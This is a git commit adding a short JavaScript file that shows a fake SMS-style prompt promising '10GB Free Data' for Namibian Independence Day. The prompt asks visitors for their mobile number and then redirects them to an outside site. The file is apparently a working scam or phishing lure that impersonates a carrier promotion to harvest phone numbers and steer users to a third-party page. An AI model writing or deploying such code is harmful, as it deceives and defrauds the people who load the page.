3f680ed47d0e3fc7e0e42602235ec176085679a2
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-03-18 00:20:04 -0700

    Create activation-code-namibia.js

---
+++ activation-code-namibia.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, you are eligible to receive 10GB Free Data as Namibian Independence day Celebration Offer, click OK to Enter your mobile Number','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://ebekpone.com/namibia-10gb.html';
+}
